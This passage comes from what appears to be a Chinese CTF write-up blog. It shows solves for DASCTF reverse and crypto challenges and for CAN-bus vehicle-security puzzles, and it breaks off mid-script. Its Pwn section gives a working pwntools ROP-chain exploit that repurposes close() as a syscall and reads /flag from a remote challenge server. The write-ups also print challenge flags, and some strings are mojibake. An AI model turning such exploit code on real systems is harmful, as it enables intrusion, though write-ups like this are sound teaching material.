class="hljs-number">125</span>,<br>        <span class="hljs-number">67</span>,<br>        <span class="hljs-number">60</span>,<br>        <span class="hljs-number">44</span>,<br>        <span class="hljs-number">34</span>,<br>        <span class="hljs-number">203</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">116</span>,<br>        <span class="hljs-number">186</span>,<br>        <span class="hljs-number">13</span>,<br>        <span class="hljs-number">71</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">30</span>,<br>        <span class="hljs-number">84</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">54</span>,<br>        <span class="hljs-number">106</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">17</span>,<br>        <span class="hljs-number">124</span>,<br>        <span class="hljs-number">87</span>,<br>        <span class="hljs-number">236</span>,<br>        <span class="hljs-number">25</span>,<br>        <span class="hljs-number">12</span>,<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">178</span>,<br>        <span class="hljs-number">165</span>,<br>        <span class="hljs-number">123</span>]<br>    key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;璇疯緭鍏ey: &#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong key lenth!&#x27;</span>)<br>        exit()<br>    flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;璇疯緭鍏lag: &#x27;</span>)<br>    array = [<br>        [<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">8</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>],<br>        [<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">8</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">3</span>],<br>        [<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">5</span>],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>]]<br>    t = yuanshen(array, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br>    IV = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: Unsupported opcode: RETURN_GENERATOR<br><span class="hljs-keyword">pass</span><span class="hljs-comment"># WARNING: Decompyle incomplete</span><br>)(t())<br>    IV = adjust_length(IV)<br>    check = qidong(flag, key, IV)<br>    <span class="hljs-keyword">if</span> check == data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;yes,yes,yes!!&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;bad,bad,bad!!&#x27;</span>)<br><br>main()<br></code></pre></td></tr></table></figure><p>GPT分析了解到是最短路径算法，根据array数组得到<code>iv=15736428</code>，最后解DES</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_des_cbc</span>(<span class="hljs-params">ciphertext, key, iv</span>):<br>    cipher = DES.new(key.encode(), DES.MODE_CBC, iv.encode())<br>    decrypted_data = unpad(cipher.decrypt(<span class="hljs-built_in">bytes</span>(ciphertext)), DES.block_size)<br>    <span class="hljs-keyword">return</span> decrypted_data.decode()<br><br>data = [<br>        <span class="hljs-number">159</span>,<br>        <span class="hljs-number">41</span>,<br>        <span class="hljs-number">201</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">67</span>,<br>        <span class="hljs-number">60</span>,<br>        <span class="hljs-number">44</span>,<br>        <span class="hljs-number">34</span>,<br>        <span class="hljs-number">203</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">116</span>,<br>        <span class="hljs-number">186</span>,<br>        <span class="hljs-number">13</span>,<br>        <span class="hljs-number">71</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">30</span>,<br>        <span class="hljs-number">84</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">54</span>,<br>        <span class="hljs-number">106</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">17</span>,<br>        <span class="hljs-number">124</span>,<br>        <span class="hljs-number">87</span>,<br>        <span class="hljs-number">236</span>,<br>        <span class="hljs-number">25</span>,<br>        <span class="hljs-number">12</span>,<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">178</span>,<br>        <span class="hljs-number">165</span>,<br>        <span class="hljs-number">123</span>]<br><br>key = <span class="hljs-string">&quot;yuanshen&quot;</span><br>iv = <span class="hljs-string">&quot;15736428&quot;</span><br><br>flag = decrypt_des_cbc(data, key, iv)<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#DASCTF&#123;D0_U_4ls0_l1k3_7uansH3n&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="asadstory"><a href="#asadstory" class="headerlink" title="asadstory"></a>asadstory</h3><p>ret2csu把close最后一位改成\x15,变成syscall然后用read控rax，openat替换open</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)  <br>elf = ELF(<span class="hljs-string">&#x27;./challenge&#x27;</span>)      <br><br><span class="hljs-comment"># p = process(&quot;./challenge&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28133</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">elf_base</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    value = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1249</span><br>    <span class="hljs-keyword">return</span> value<br><br>elf.address = elf_base()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;elf--&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(elf.address))<br><br>csu1 = elf.address + <span class="hljs-number">0x1620</span><br>csu2 = elf.address + <span class="hljs-number">0x163a</span><br><br>offset = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><br><span class="hljs-comment"># Craft the ROP chain</span><br>rop_chain = [<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>], <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">257</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span> + <span class="hljs-number">0x30</span>, <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>],<br>    csu1<br>]<br><br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span>.join([p64(addr) <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> rop_chain])<br><br><br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendline(offset + payload)<br>p.send(<span class="hljs-string">b&#x27;\x15&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">257</span> - <span class="hljs-number">5</span>))<br>p.send(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="GeneratePrime"><a href="#GeneratePrime" class="headerlink" title="GeneratePrime"></a>GeneratePrime</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n=<span class="hljs-number">43090231453250894711427929679917165532091051269639380881822679198388872373018031295429558758883298138388596507242928145888959963579111847255588834248367032580980272245414738073179172684104908272069503607376171584936239696444309039211273376010193165083254209608051430794825261116490356392215410064858020176711199543381037420111454942356936721487016187240237683725310306748046587503625096246489043270381153251813360521583717685413070481576320194446237522118380283335294528606720928637529817170809666802598938788405154468683850385277659812316577873886708164549255359514776884765904417881419804464020855420288884972204146588152412816874161445668955639456202226751519881834234916642218078966066353317917939418964763844067220460513388433020071277477619189495465483910271310025371745344364984826481983188861624474015117761898377237745775289039922285111681410319016537270412509750339539020876501534842403407208957382830000761065368861209033791387480377889838737241326116532852335478193204425626487166234964754732945953080086117315162916374952094149599597509405176646068341218684523765974759907645226607364627690026025662221036766148813918691578120023886400197652148214238256715089883892069133754778609710846757189987335827693169644541734443763194942694587436469448973201513131503797898892822373949177030567791519349220158287318717788746060997955057747930375117780320371517616412423571775682868481089431670802944047375824503353609019686495670630728618082254293585479431369645935654024149490741245953271830453426444847467908952699660750809490650479987</span><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">30862228874892553476569860337345503267926249096036551213683005116620750680365154103242717714230966827288361499342464202425467642950081816675486231250411347472976482409360391136808439034217688010072648722396312121758844966972323513456884732046270240934002095706243044210312663525491282667971502534420245427643076262414036655243117610886157895994101178663474990136516153062956803591842233732498519246731337518545018734984319536536205092573418457928952414660837594265802406473201400259189950484841504227372735345451459452313825309333631615286962304963039625162366186574440146535361888708570569938418676320446653266676364765870547213167058713058609788316647593834008151805692510044158607162858906528913516242904419457446211348504248317409844426309455978985314882123424453618672960876022996245213882467954521212481418830104602302179759479012618982228223244131619557639469872139485197176384683400796204681045965981417650462297978265085323342772310690638049411549216990505001950512428646871875659468885490055363436412364532718888124906227240501145227269727887236864060558999336443165765870556727793253297515155026234234422303238380776900105115890363548589834345888430695886678231459920101695996112312269637459823479947618045447071359886515163416153117176539752947700226596291435270282598638974889205601333097978743387412651687356072223691445472690647184292120882095587563356691450107194982597794937293154289560470269606300576216128045797481404606810315677962659136641943747123985144899464108823536597185386155005111274476874957827391438859327653936</span><br>k = <span class="hljs-number">5</span><br><br>R = Zmod(n)[<span class="hljs-string">&quot;x&quot;</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    Q = R.quo(R.random_element(k))<br>    pp = gcd(ZZ(<span class="hljs-built_in">list</span>(Q.random_element() ^ n)[<span class="hljs-number">1</span>]), n)<br>    <span class="hljs-keyword">if</span> pp != <span class="hljs-number">1</span>:<br>        qq = <span class="hljs-built_in">sum</span>([pp**i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k)])<br>        rr = n // (pp * qq)<br>        <span class="hljs-keyword">assert</span> n == pp * qq * rr<br>        <span class="hljs-keyword">break</span><br>phi = (pp - <span class="hljs-number">1</span>) * (qq - <span class="hljs-number">1</span>) * (rr - <span class="hljs-number">1</span>)<br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br><br><span class="hljs-comment">#DASCTF&#123;just_a_very_very_easy_task_with_your_talent_is_not&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DASCTF月赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>车联网安全锦标赛</title>
    <link href="/2023/11/24/2023%E5%85%A8%E5%9B%BD%E6%99%BA%E8%83%BD%E9%A9%BE%E9%A9%B6%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2023/11/24/2023%E5%85%A8%E5%9B%BD%E6%99%BA%E8%83%BD%E9%A9%BE%E9%A9%B6%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>车联网的题目太少了，其中还有一个是原题，另一个也只是简单的CAN报文分析，抽象脑洞题目太多，当然最后中国移动毫无疑问的的拿走冠军😂简单写一下和车有关系的两个题目，另一个蓝牙流量的题目改天写个专题（挖坑；其他的题目没什么好写的）[写完了😝]</p><h2 id="CAN-RSA"><a href="#CAN-RSA" class="headerlink" title="CAN RSA"></a>CAN RSA</h2><p>感觉每次CAN报文的密码题都是一模一样的）难绷<br>解数据包，直接拿#2开头的后七字节拼起来即可，参考：<br><a href="https://archives.sector.ca/presentations17/Eric-Evenchick-REAutoDiag.pdf">https://archives.sector.ca/presentations17/Eric-Evenchick-REAutoDiag.pdf</a><br>解出来是一个RSA的PEM公钥，但后面部分被Corrupt，而且用Crypto.PublicKey解不出来，于是手撕一下，参考：<br><a href="https://tover.xyz/p/pem-by-hand/#RSA%E5%85%AC%E9%92%A5">https://tover.xyz/p/pem-by-hand/#RSA%E5%85%AC%E9%92%A5</a><br>解出来的N放在factorDB上可以分解，顺便搜了一下可以找到e，参考：<br><a href="https://github.com/RsaCtfTool/RsaCtfTool/issues/304">https://github.com/RsaCtfTool/RsaCtfTool/issues/304</a><br>最后解密即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://archives.sector.ca/presentations17/Eric-Evenchick-REAutoDiag.pdf</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./candump.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    fr = f.read()<br>data = [x.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">2</span>].split(<span class="hljs-string">&#x27;#&#x27;</span>)[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> fr.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]][<span class="hljs-number">10</span>: -<span class="hljs-number">4</span>]<br><span class="hljs-comment">#data = &#x27;&#x27;.join([x[2:].split(&#x27;7D&#x27;)[0] for x in data])</span><br>key = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-comment">#print(i, data[i], bytes.fromhex(data[i][2:]))</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;7D&#x27;</span> <span class="hljs-keyword">in</span> data[i]:<br>        tmp = data[i].split(<span class="hljs-string">&#x27;7D&#x27;</span>)   <span class="hljs-comment"># ????</span><br>        key += tmp[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>:] + <span class="hljs-string">&#x27;4242&#x27;</span> + tmp[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        key += data[i][<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">import</span> base64<br>key = <span class="hljs-built_in">bytes</span>.fromhex(key)<br><span class="hljs-comment">#print(key.decode())</span><br><span class="hljs-comment">#print(base64.b64decode(b&#x27;&#x27;.join(key.split(b&#x27;\n&#x27;)[1:-1])).hex())</span><br><br>n = <span class="hljs-number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="hljs-comment"># factorDB</span><br>p = <span class="hljs-number">15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span><br>q = <span class="hljs-number">28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span><br><span class="hljs-keyword">assert</span> p * q == n<br><br><span class="hljs-comment"># https://github.com/RsaCtfTool/RsaCtfTool/issues/304</span><br>e = <span class="hljs-number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><br>c = <span class="hljs-number">49204714858589959506425439175649050431712689077552080337419353493097408019421214668787900602380476464749282877075822584378756221224722944848685142270406954588911362016685713099949058708493084032575436033859064998703946175169856560687276793237892152502134788316092552043085946089668969326209343517732349235471</span><br><br><span class="hljs-keyword">import</span> libnum<br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = libnum.n2s(m)<br><span class="hljs-comment">#print(d)</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#b&#x27;fk32mhjlyr9pfamg97999c6b07a8ce82Hds5XEUIqFw8ZR4NLM0lPjtBGT3cDJhmen&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="can通信三字经"><a href="#can通信三字经" class="headerlink" title="can通信三字经"></a>can通信三字经</h2><p>首先将所有相同CAN ID的报文连在一起，发现，CAN ID为911的报文有所需数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 正则表达式匹配数据</span><br>log_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;^\(\d+\.\d+\)\s+can1\s+([\dA-F]&#123;3&#125;)#([0-9A-F]*)$&#x27;</span>)<br><br>can_data = &#123;&#125;<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;candump.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        line = line.strip()  <span class="hljs-comment"># 去除行尾的换行符</span><br>        <span class="hljs-keyword">match</span> = log_pattern.<span class="hljs-keyword">match</span>(line)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            can_id, data = 